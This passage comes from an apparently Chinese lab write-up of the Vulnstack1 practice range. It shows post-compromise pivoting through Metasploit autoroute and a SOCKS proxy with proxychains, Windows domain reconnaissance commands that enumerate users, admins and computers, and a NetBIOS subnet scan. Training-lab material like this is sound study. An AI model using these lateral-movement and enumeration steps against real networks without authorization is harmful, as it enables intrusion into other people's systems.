+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e.png&#34;
+	width=&#34;1229&#34;
+	height=&#34;480&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e_hu77b79f31cd4aece7d2fdc405517590a0_113849_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721097425895-19d58acb-7f37-4d09-854f-125d6c05d34e_hu77b79f31cd4aece7d2fdc405517590a0_113849_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;256&#34;
+		data-flex-basis=&#34;614px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;内网渗透&#34;&gt;内网渗透
+&lt;/h2&gt;&lt;h3 id=&#34;横向移动&#34;&gt;横向移动
+&lt;/h3&gt;&lt;h4 id=&#34;搭建隧道&#34;&gt;搭建隧道
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;横向渗透前，先将该web服务器配置为代理服务器当作跳板机。&lt;/font&gt;&lt;/p&gt;
+&lt;h5 id=&#34;font-stylecolorrgb79-79-79msfproxychainsfont&#34;&gt;&lt;font style=&#34;color:rgb(79, 79, 79);&#34;&gt;msf+proxychains&lt;/font&gt;
+&lt;/h5&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;可用msf直接搭建sock隧道：&lt;br&gt;
+&lt;/font&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;进入session，自动创建路由：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run post/multi/manage/autoroute&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734.png&#34;
+	width=&#34;906&#34;
+	height=&#34;151&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734_hu68551fa8c97eda75f702115cf0d848eb_96848_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013086121-48005396-850e-4ddf-b280-674d13757734_hu68551fa8c97eda75f702115cf0d848eb_96848_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;600&#34;
+		data-flex-basis=&#34;1440px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看路由：&lt;/font&gt;&lt;br&gt;
+&lt;code&gt;run autoroute -p&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9.png&#34;
+	width=&#34;865&#34;
+	height=&#34;243&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9_hueb9877694e6239428250caa893935620_111150_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013134696-f00349e9-afb2-42d3-bc39-6470ebc081c9_hueb9877694e6239428250caa893935620_111150_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;355&#34;
+		data-flex-basis=&#34;854px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;search autoroute
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; session
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route print  &lt;span class=&#34;c1&#34;&gt;#打印路由&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;退到上层，使用socks4a进行代理，端口与proxychains里设置一致即可：&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;background
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use auxiliary/server/socks_proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b.png&#34;
+	width=&#34;870&#34;
+	height=&#34;163&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b_hu4907336907c764c7bd79c28171addbb3_125565_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013385779-ee28a07e-c777-4fbf-81bc-9e484269b37b_hu4907336907c764c7bd79c28171addbb3_125565_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;533&#34;
+		data-flex-basis=&#34;1280px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f.png&#34;
+	width=&#34;1115&#34;
+	height=&#34;133&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f_hu6c32db8dfa057b8df6dcb6240c6f76e2_73466_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100173230-e5352e25-8974-4402-847e-097f57258d7f_hu6c32db8dfa057b8df6dcb6240c6f76e2_73466_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;838&#34;
+		data-flex-basis=&#34;2012px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以选择socks4a或者socks5&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;run后 可用jobs查看任务是否执行：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;jobs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7.png&#34;
+	width=&#34;650&#34;
+	height=&#34;262&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7_huc29c5ecdb2ae4a0f38edbcff7228bd19_103515_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721013488768-5ccd7799-4a6b-4c19-802f-b081e82501b7_huc29c5ecdb2ae4a0f38edbcff7228bd19_103515_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;248&#34;
+		data-flex-basis=&#34;595px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;要将srvhost设置为127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;srvport &lt;span class=&#34;m&#34;&gt;1080&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/proxychains4.conf										&lt;span class=&#34;c1&#34;&gt;# 配置proxychains4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socks4 127.0.0.1 1080											&lt;span class=&#34;c1&#34;&gt;# 这里的ip需要跟上面的socks4a模块一致 						&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;proxychains4 curl http://内网ip/						&lt;span class=&#34;c1&#34;&gt;# 使用proxychains4代理访问被控主机，查看是否能使用						&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;内网ip 看ipconfig
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651.png&#34;
+	width=&#34;362&#34;
+	height=&#34;200&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651_hu46a425d3323adbcacc8edfa7ede17963_34963_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100283675-231d385b-4e38-4ec1-a5a0-d1cbb3511651_hu46a425d3323adbcacc8edfa7ede17963_34963_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;434px&#34;
+	
+&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb.png&#34;
+	width=&#34;905&#34;
+	height=&#34;223&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb_hu226c9a1530b751ddebea461b8cca7d1f_145044_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721100809938-fed6ae20-ee12-45e4-aa89-3dea016928bb_hu226c9a1530b751ddebea461b8cca7d1f_145044_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;405&#34;
+		data-flex-basis=&#34;973px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;内网信息收集&#34;&gt;内网信息收集
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;ipconfig/all&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f.png&#34;
+	width=&#34;466&#34;
+	height=&#34;198&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f_hu27c40cede0e07a56f2ca3dc4d131c232_37316_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721101529384-c3ff6958-d910-4573-8880-46a9d577872f_hu27c40cede0e07a56f2ca3dc4d131c232_37316_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;235&#34;
+		data-flex-basis=&#34;564px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;发现DNS服务器为&lt;/font&gt;&lt;code&gt;god.org&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;，使用&lt;/font&gt;&lt;code&gt;net view&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看域信息，发现三台主机&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc.png&#34;
+	width=&#34;839&#34;
+	height=&#34;265&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc_hu18a7cd11588fa71c3f94aa2e7e65fc1f_68973_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721111661971-b0fd25a7-6a4a-4bf0-87b1-441097cd9acc_hu18a7cd11588fa71c3f94aa2e7e65fc1f_68973_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;316&#34;
+		data-flex-basis=&#34;759px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能看到两台主机,还有一台应该是本身这台&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net view /domain&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看主域信息&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02.png&#34;
+	width=&#34;704&#34;
+	height=&#34;209&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02_hu3a0633ae8f0e93e2013eb485582cb3c6_45324_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112156826-7f26a157-e291-4e65-af40-6b7abd854d02_hu3a0633ae8f0e93e2013eb485582cb3c6_45324_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;336&#34;
+		data-flex-basis=&#34;808px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;shell net time /domain&lt;/code&gt;查看时间服务器&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e.png&#34;
+	width=&#34;619&#34;
+	height=&#34;177&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e_hucf72065d9935969817b427bf77be4517_49617_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112342706-49f12f7c-6bbf-4364-9fc6-4c5886907e4e_hucf72065d9935969817b427bf77be4517_49617_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;349&#34;
+		data-flex-basis=&#34;839px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net config workstation&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查询当前的登录域与用户信息(这里需要使用域用户，既未提权之前的用户)&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;这里由于提了权,执行失败,换了个administrator的域用户&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53.png&#34;
+	width=&#34;797&#34;
+	height=&#34;326&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53_hu7b4a0be95b72244c52e3f5be94f0a8b6_94440_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53_hu7b4a0be95b72244c52e3f5be94f0a8b6_94440_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;244&#34;
+		data-flex-basis=&#34;586px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nslookup god.org&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;利用 nslookup 命令直接解析域名服务器&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad.png&#34;
+	width=&#34;368&#34;
+	height=&#34;155&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad_hu7b40b213791ae256a59fe665c7d06e85_41600_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad_hu7b40b213791ae256a59fe665c7d06e85_41600_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;237&#34;
+		data-flex-basis=&#34;569px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看当前域的所有用户&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae.png&#34;
+	width=&#34;744&#34;
+	height=&#34;300&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae_hu0778f3ca9d53a574e02246e6341b1d3e_77680_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae_hu0778f3ca9d53a574e02246e6341b1d3e_77680_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;248&#34;
+		data-flex-basis=&#34;595px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wmic useraccount get /all&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;获取域内用户的详细信息,可以获取到用户名，描述信息，SID 域名等&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3.png&#34;
+	width=&#34;1636&#34;
+	height=&#34;324&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3_hudf08e45b524becc3b8812bf5435a3430_240479_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3_hudf08e45b524becc3b8812bf5435a3430_240479_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;504&#34;
+		data-flex-basis=&#34;1211px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net group &amp;quot;domain computers&amp;quot; /domain&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看所有域成员计算机列表&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb.png&#34;
+	width=&#34;954&#34;
+	height=&#34;318&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb_huc8be34ae8015b5dad1290530abadf260_87565_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb_huc8be34ae8015b5dad1290530abadf260_87565_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;300&#34;
+		data-flex-basis=&#34;720px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net group &amp;quot;domain admins&amp;quot; /domain&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看域管理员&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421.png&#34;
+	width=&#34;857&#34;
+	height=&#34;313&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421_hu56ec671444bcc5dddc3e14514979b158_77541_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421_hu56ec671444bcc5dddc3e14514979b158_77541_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;273&#34;
+		data-flex-basis=&#34;657px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;横向探测&#34;&gt;横向探测
+&lt;/h3&gt;&lt;h4 id=&#34;扫主机&#34;&gt;扫主机
+&lt;/h4&gt;&lt;h5 id=&#34;font-stylecolorrgb77-77-77msffont&#34;&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;msf&lt;/font&gt;
+&lt;/h5&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;proxychains4只支持支持socks，http, https协议，它们都是以tcp或者udp协议为基础，而 ping用的是ICMP协议，所以使用&lt;/font&gt;&lt;code&gt;nmap -sn&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;是无法扫出来的，可以使用udp和tcp协议扫&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;使用&lt;/font&gt;&lt;code&gt;nbname&lt;/code&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;探测模块&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use auxiliary/scanner/netbios/nbname
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhost 192.168.52.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h5 id=&#34;cs&#34;&gt;cs
+&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc.png&#34;
+	width=&#34;624&#34;
+	height=&#34;181&#34;
